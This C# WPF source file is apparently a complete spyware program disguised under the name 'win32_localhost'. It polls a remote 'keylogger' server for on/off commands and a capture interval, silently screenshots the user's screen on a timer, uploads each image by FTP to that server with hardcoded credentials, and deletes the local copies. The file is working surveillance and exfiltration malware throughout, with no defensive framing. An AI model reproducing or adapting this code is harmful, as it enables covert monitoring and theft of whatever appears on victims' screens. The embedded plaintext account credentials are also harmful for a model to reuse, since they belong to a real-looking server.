using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;


namespace win32_localhost
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public static Int32 _flag = -1;
        public static string _path;
        public static string filename;
        public MainWindow()
        {
            InitializeComponent();

            string _path = GetTemporaryDirectory();
            //label.Content = _path;
            //label2.Content = System.IO.Path.GetTempPath();
            //File.Create("path.txt");

            DispatcherTimer connectionTimer = new DispatcherTimer();
            connectionTimer.Tick += new EventHandler(connectionTimer_Tick);
            connectionTimer.Interval = new TimeSpan(0, 0, 11);
            connectionTimer.Start();

            int t = getTime();

            

            DispatcherTimer screenshotTimer = new DispatcherTimer();
            screenshotTimer.Tick += new EventHandler(screenshotTimer_Tick);
            screenshotTimer.Interval = new TimeSpan(0, 0, t);
            screenshotTimer.Start();

            DispatcherTimer uploadTimer = new DispatcherTimer();
            uploadTimer.Tick += new EventHandler(uploadTimer_Tick);
            uploadTimer.Interval = new TimeSpan(0, 0, t + 6);
            uploadTimer.Start();

           
        }

        private int connection()
        {
            try
            {
                InitializeComponent();
                WebClient client = new WebClient();
                Stream stream = client.OpenRead("http://www.jugaad.eu.pn/keylogger/status.txt");
                StreamReader reader = new StreamReader(stream);
                String content = reader.ReadToEnd();
                if (content.Equals("1"))
                {
                    return 1;
                }
                else if (content.Equals("0"))
                {
                    return 0;
                }
                else
                {
                    return 1;
                }
            }
            catch
            {
                return -1;
            }
        }

        private int getTime()
        {
            int t;
            try
            {
                InitializeComponent();
                WebClient client = new WebClient();
                Stream stream = client.OpenRead("http://www.jugaad.eu.pn/keylogger/time.txt");
                StreamReader reader = new StreamReader(stream);
                String content = reader.ReadToEnd();


                if (content.Equals("15"))
                    t = 15;
                else if (content.Equals("30"))
                    t = 30;
                else if (content.Equals("60"))
                    t = 60;
                else if (content.Equals("300"))
                    t = 300;
                else if (content.Equals("900"))
                    t = 900;
                else if (content.Equals("1800"))
                    t = 1800;
                else if (content.Equals("3600"))
                    t = 3600;
                else
                    t = 300;

                return t;
            }
            catch
            {
                return t = 60;
            }
        }

        private void connectionTimer_Tick(object sender, EventArgs e)
        {

            int check = connection();
            if (check == 1)
            {
                _flag = 1;
                
            }
            else if (check == 0)
            {
                _flag = 0;
            }
            else
            {
                _flag = -1;
            }

        }

        private void screenshotTimer_Tick(object sender, EventArgs e)
        {
            try
            {
                if (_flag != 0)
                {
                    ScreenCapture sc = new ScreenCapture();
                    DateTime time = DateTime.Now;
                    string name = time.ToString("yyyy-MM-dd-HH-mm-ss");
                    string _path = GetTemporaryDirectory();
                    sc.CaptureScreenToFile(System.IO.Path.Combine(_path, (name + ".jpeg")), ImageFormat.Jpeg);
                    if (_flag == 1)
                    {
                        uploadImage((name + ".jpeg"), System.IO.Path.Combine(_path, (name + ".jpeg")));
                        File.Delete(System.IO.Path.Combine(_path, (name + ".jpeg")));

                    }
                }
            }
            catch { }
            
        }

        private void uploadTimer_Tick(object sender, EventArgs e)
        {
            if (_flag == 1)
            {
                
                try
                {
                    
                    //TextWriter tw = new StreamWriter("path.txt", true);
                    string[] array1 = Directory.GetFiles(System.IO.Path.Combine(System.IO.Path.GetTempPath(), "screenshots"));
                    foreach (string name in array1)
                    {
                        
                        string[] split = name.Split(new char[] { '\\' });
                        foreach(string bloc in split){
                            if (bloc.EndsWith(".jpeg"))  
                                filename = bloc;  
                        }
                        uploadImage(filename,name);
                        File.Delete(name);
                        filename = "";
                    }
                }
                catch
                {

                }
            }
        }

       private void uploadImage(string name, string address)
        {
            try
            {
                FtpWebRequest req = (FtpWebRequest)WebRequest.Create("ftp://jugaad.eu.pn/jugaad.eu.pn/keylogger/screenshots/" + name);
                req.UseBinary = true;
                req.Method = WebRequestMethods.Ftp.UploadFile;
                req.Credentials = new NetworkCredential("858139_jugaad", "reliance3g");
                byte[] fileData = File.ReadAllBytes(address);

                req.ContentLength = fileData.Length;
                Stream reqStream = req.GetRequestStream();
                reqStream.Write(fileData, 0, fileData.Length);
                reqStream.Close();
            }
            catch
            {

            }
        }

       public string GetTemporaryDirectory()
       {
           string tempDirectory = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "screenshots\\");
           Directory.CreateDirectory(tempDirectory);
           return tempDirectory;
       }

        

    }
}
